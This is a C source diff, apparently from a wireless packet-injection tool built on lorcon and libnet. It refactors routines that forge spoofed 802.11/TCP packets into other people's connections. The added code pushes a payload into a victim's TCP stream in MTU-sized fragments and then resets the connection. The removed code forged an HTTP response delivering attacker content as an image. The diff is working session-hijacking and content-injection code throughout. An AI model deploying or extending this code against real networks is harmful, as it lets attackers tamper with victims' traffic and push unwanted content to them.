@@ -23,12 +23,8 @@
 #include "ao_main.h"
 #include "ao_packet.h"
 #include "ao_util.h"
-
-// Data
-/*
-static uint8_t* ao_payload_data = NULL;
-static uint32_t ao_payload_size = 0;
-*/
+#include "ao_content.h"
+#include "ao_payload.h"
 
 // Main packet handler
 void ao_pck_loop(lorcon_t* context, lorcon_packet_t* packet, u_char* user)
@@ -57,7 +53,11 @@ void ao_pck_loop(lorcon_t* context, lorcon_packet_t* packet, u_char* user)
     // Log
     ao_pck_log(&pck);
     
-    // Inject
+    // Content
+    //ctx_tcp_proc(&pck);
+    
+    // Payload
+    ao_payload_pck(&pck);
     
     // Free
     ao_pck_ieee80211_free(&pck);
@@ -432,32 +432,43 @@ void ao_pck_udp_free(st_ao_packet* pck)
 
 }
 
-#if 0
-void ao_inject_tcp(
-    lorcon_t* context,
-    struct ieee80211_hdr* hdr_w,
-    struct llc_hdr* hdr_llc,
-    struct iphdr* hdr_ip, 
-    struct tcphdr* hdr_tcp,
-    char* rsp_data,
-    uint32_t rsp_len,
-    uint8_t tcp_flags,
-    uint32_t* tcp_seq)
+void ao_inj_tcp(st_ao_packet* pck, guint8* pl_data, guint32 pl_size)
 {
-    // Vars
-
-    //uint8_t fcs_present;
-    
     // Debug
-    printf("* injt! len=%u\n", rsp_len);
+    //printf("* injecting: %s\n", response_data);
+
+    // Sequence
+    guint32 tcp_seq = ntohl(pck->m4.tcp.hdr->ack_seq);
+    
+    // Fragment
+    guint32 mtu = 1500;
+    guint32 offset;
+    for (offset = 0; offset < pl_size; offset += mtu){
+        guint16 len = pl_size - offset;
+        if(len > mtu)
+            len = mtu;
+
+        ao_inj_tcp_raw(pck, pl_data + offset, len, TH_PUSH | TH_ACK, &tcp_seq);
+    }
+
+    // Connection reset
+    if (1)
+        ao_inj_tcp_raw(pck, NULL, 0, TH_RST | TH_ACK, &tcp_seq);
+}
+
+
+void ao_inj_tcp_raw(st_ao_packet* pck, guint8* rsp_data, guint32 rsp_len, guint8 tcp_flags, guint32* tcp_seq)
+{
+    // Debug
+    printf("[inj] sending! len=%u\n", rsp_len);
 
     // libnet wants the data in host-byte-order
-    u_int tcp_ack = ntohl(hdr_tcp->seq) + ( ntohs(hdr_ip->tot_len) - hdr_ip->ihl * 4 - hdr_tcp->doff * 4 );
+    u_int tcp_ack = ntohl(pck->m4.tcp.hdr->seq) + (ntohs(pck->m3.ipv4.hdr->tot_len) - pck->m3.ipv4.hdr->ihl * 4 - pck->m4.tcp.hdr->doff * 4);
 
     // TCP
-    ln_tcp_t = libnet_build_tcp(
-        ntohs(hdr_tcp->dest), // source port
-        ntohs(hdr_tcp->source), // dest port
+    pck->ao_inst->ln_tcp_t = libnet_build_tcp(
+        ntohs(pck->m4.tcp.hdr->dest), // source port
+        ntohs(pck->m4.tcp.hdr->source), // dest port
         *tcp_seq, // sequence number
         tcp_ack, // ack number
         tcp_flags, // flags
@@ -467,16 +478,16 @@ void ao_inject_tcp(
         20 + rsp_len, // total length of the TCP packet
         (uint8_t*) rsp_data, // response
         rsp_len, // response_length
-        ao_lnet, // libnet_t pointer
-        ln_tcp_t // ptag
+        pck->ao_inst->ln_inst, // libnet_t pointer
+        pck->ao_inst->ln_tcp_t // ptag
     );
 
-    if (ln_tcp_t == -1){
-        printf("libnet_build_tcp returns error: %s\n", libnet_geterror(ao_lnet));
+    if (pck->ao_inst->ln_tcp_t == -1){
+        g_print("[inj] libnet_build_tcp returns error: %s\n", libnet_geterror(pck->ao_inst->ln_inst));
         return;
     }
 
-    ln_ip_t = libnet_build_ipv4(
+    pck->ao_inst->ln_ip_t = libnet_build_ipv4(
         40 + rsp_len, // length
         0, // TOS bits
         1, // IPID (need to calculate)
@@ -484,26 +495,26 @@ void ao_inject_tcp(
         0xff, // TTL
         6, // protocol
         0, // checksum
-        hdr_ip->daddr, // source address
-        hdr_ip->saddr, // dest address
+        pck->m3.ipv4.hdr->daddr, // source address
+        pck->m3.ipv4.hdr->saddr, // dest address
         NULL, // response
         0, // response length
-        ao_lnet, // libnet_t pointer
-        ln_ip_t // ptag
+        pck->ao_inst->ln_inst, // libnet_t pointer
+        pck->ao_inst->ln_ip_t // ptag
     );
 
-    if(ln_ip_t == -1){
-        printf("libnet_build_ipv4 returns error: %s\n", libnet_geterror(ao_lnet));
+    if(pck->ao_inst->ln_ip_t == -1){
+        g_print("[inj] libnet_build_ipv4 returns error: %s\n", libnet_geterror(pck->ao_inst->ln_inst));
         return;
     }
 
     // copy the libnet packets to to a buffer to send raw..
     uint8_t pck_buf[0x10000];
     struct ieee80211_hdr* hdr_w_n = (struct ieee80211_hdr*) pck_buf;
-    memcpy(hdr_w_n, hdr_w, sizeof(struct ieee80211_hdr));
+    memcpy(hdr_w_n, pck->m2.dot11.iw, sizeof(struct ieee80211_hdr));
     
     struct llc_hdr* hdr_llc_n = (struct llc_hdr*) (pck_buf + sizeof(struct ieee80211_hdr));
-    memcpy(hdr_llc_n, hdr_llc, sizeof(struct llc_hdr));
+    memcpy(hdr_llc_n, pck->m2.dot11.llc, sizeof(struct llc_hdr));
 
     // set the FROM_DS flag and swap MAC addresses
     hdr_w_n->u1.fc.from_ds = 1;
@@ -513,7 +524,7 @@ void ao_inject_tcp(
     if(wepkey)
         n_w_hdr->flags |= IEEE80211_WEP_FLAG;
     */
-    hdr_llc_n->type = LLC_TYPE_IP;
+    hdr_llc_n->type = LLC_TYPE_IPV4;
 
     uint8_t tmp_addr[6];
     memcpy(tmp_addr, hdr_w_n->addr1, 6);
@@ -525,18 +536,18 @@ void ao_inject_tcp(
 
     // cull_packet will dump the packet (with correct checksums) into a
     // buffer for us to send via the raw socket
-    if(libnet_adv_cull_packet(ao_lnet, &lnet_pck_buf, &pck_len) == -1){
+    if(libnet_adv_cull_packet(pck->ao_inst->ln_inst, &lnet_pck_buf, &pck_len) == -1){
         printf("libnet_adv_cull_packet returns error: %s\n", 
-        libnet_geterror(ao_lnet));
+        libnet_geterror(pck->ao_inst->ln_inst));
         return;
     }
 
     memcpy(pck_buf + sizeof(struct ieee80211_hdr) + sizeof(struct llc_hdr), lnet_pck_buf, pck_len);
 
-    libnet_adv_free_packet(ao_lnet, lnet_pck_buf);
+    libnet_adv_free_packet(pck->ao_inst->ln_inst, lnet_pck_buf);
 
     // total packet length
-    int len = sizeof(struct ieee80211_hdr) + sizeof(struct llc_hdr) + 40 + rsp_len;
+    gint len = sizeof(struct ieee80211_hdr) + sizeof(struct llc_hdr) + 40 + rsp_len;
   
     /*
     if(wepkey){
@@ -556,88 +567,16 @@ void ao_inject_tcp(
     }
     */
 
-    // Establish lorcon packet transmission structure
-    /*
-    lorcon_packet_t in_pck;
-    in_pck.dlt = 0;
-    in_pck.channel = ao_channel;
-    in_pck.lcpa = NULL;
-    in_pck.free_data = 0;
-    
-    in_pck.extra_info = NULL;
-    in_pck.extra_type = LORCON_PACKET_EXTRA_NONE;
-    
-    in_pck.packet_raw = pck_buf;
-    in_pck.packet_header = pck_buf;
-    in_pck.packet_data = NULL;
-    in_pck.length = len;
-    in_pck.length_header = len;
-    */
-
-    dumphex((uint8_t*) pck_buf, len);
+    // Debug
+    //dumphex((uint8_t*) pck_buf, len);
 
     // Send the packet
-    if (lorcon_send_bytes(context, len, pck_buf) < 0) {
-    //if (lorcon_inject(context, &in_pck) < 0) {
-    //if (tx80211_txpacket(&ctx->inject_tx, &ctx->in_packet) < 0) {
-        printf("Unable to transmit packet!\n");
-        //perror("tx80211_txpacket");
+    if (lorcon_send_bytes(pck->lor_ctx, len, pck_buf) < 0) {
+        g_print("[inj] unable to transmit packet!\n");
         return;
     }
 
-    *tcp_seq += rsp_len;  //advance the sequence number
-  
-    //printlog(ctx, 2, "wrote %d bytes to the wire(less)\n", len);
+    // Sequence counter
+    *tcp_seq += rsp_len;
 }
-
-void ao_spoof(
-    lorcon_t* context,
-    struct ieee80211_hdr* hdr_w,
-    struct llc_hdr* hdr_llc,
-    struct iphdr* hdr_ip, 
-    struct tcphdr* hdr_tcp,
-    uint8_t* tcp_data,
-    uint16_t tcp_len)
-{
-    uint32_t tcp_seq = ntohl(hdr_tcp->ack_seq);
-    
-    // Response
-    //char* rsp_data = "HTTP/1.1 200 OK\r\n"
-    //    "Content-Type: text/html;charset=UTF-8\r\n"
-    //    "Content-Length: 6\r\n"
-    //    "\r\nPWNED!";
-    //uint32_t rsp_len = strlen(rsp_data) + 1;
-    // text/html;charset=UTF-8
-    char* rsp_data = g_strdup_printf(
-        "HTTP/1.1 200 OK\r\n"
-        "Content-Type: image/jpeg\r\n"
-        "Content-Length: %d\r\n\r\n", ao_payload_size);
-    rsp_data = g_realloc(rsp_data, strlen(rsp_data) + ao_payload_size);
-    g_memmove(rsp_data + strlen(rsp_data), ao_payload_data, ao_payload_size);
-    uint32_t rsp_len = strlen(rsp_data) + ao_payload_size;
-  
-    //printf("* injecting: %s\n", response_data);
-
-    // Fragment
-    uint32_t mtu = 1500;
-    uint32_t offset;
-    for (offset = 0; offset < rsp_len; offset += mtu){
-        uint16_t len = rsp_len - offset;
-        if(len > mtu)
-            len = mtu;
-
-        //printlog(ctx, 4, "packet length: %hu, mtu: %hu, seq: %u\n", len, ctx->iface_mtu, seqnum);
-
-        ao_inject_tcp(context, hdr_w, hdr_llc, hdr_ip, hdr_tcp, 
-            rsp_data + offset, len, 
-            TH_PUSH | TH_ACK, &tcp_seq);
-    }
-
-    // follow up the packet with a reset packet if conf tells us to..
-    if (1)
-        ao_inject_tcp(context, hdr_w, hdr_llc, hdr_ip, hdr_tcp, NULL, 0, TH_RST | TH_ACK, &tcp_seq);
-        
-    g_free(rsp_data);
-}
-#endif
 
